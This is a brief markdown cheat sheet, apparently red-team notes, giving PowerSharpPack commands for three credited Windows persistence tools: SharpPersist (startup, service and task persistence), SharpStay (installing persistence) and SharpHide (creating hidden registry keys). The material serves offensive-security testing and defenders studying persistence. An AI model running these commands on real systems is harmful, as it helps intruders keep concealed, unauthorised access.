
**SharpPersist**  
Windows persistence toolkit that allows for a variety of persistence techniques on Windows systems.  
@Credit to: https://github.com/fireeye/SharPersist  
```bash
PowerSharpPack -SharpPersist -Command "startup"

PowerSharpPack -SharpPersist -Command "service"

PowerSharpPack -SharpPersist -Command "task"
```

**SharpStay**  
.NET project for installing persistence.  
@Credit to: https://github.com/0xthirteen/SharpStay  
```bash
PowerSharpPack -SharpStay -Command "install"
PowerSharpPack -SharpStay -Command "remove"
```

**SharpHide**  
Tool to create hidden registry keys.  
@Credit to: https://github.com/outflanknl/SharpHide  
```bash
PowerSharpPack -SharpHide -Command "create /key:HKLM\Software\HiddenKey"
PowerSharpPack -SharpHide -Command "delete /key:HKLM\Software\HiddenKey"
```
